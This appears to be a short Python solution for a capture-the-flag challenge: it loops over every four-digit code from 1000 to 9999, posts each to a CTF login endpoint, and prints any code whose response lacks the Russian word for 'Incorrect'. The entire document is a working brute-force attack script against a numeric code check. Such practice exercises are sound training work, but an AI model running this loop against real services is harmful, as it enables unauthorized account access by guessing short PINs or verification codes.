import requests
url = 'https://77c3551e-b81c-4c22-abbd-79cce0619b25.ctf.ctfinf.ru/'

for x in range(1000, 10000):
    dt = {'auth': 'true', 'code': f'{x}'}
    resp = requests.post(url, dt)
    if 'Неверный' not in resp.content.decode('utf-8'):
        print(x)
    if x % 1000 == 0:
        print(x)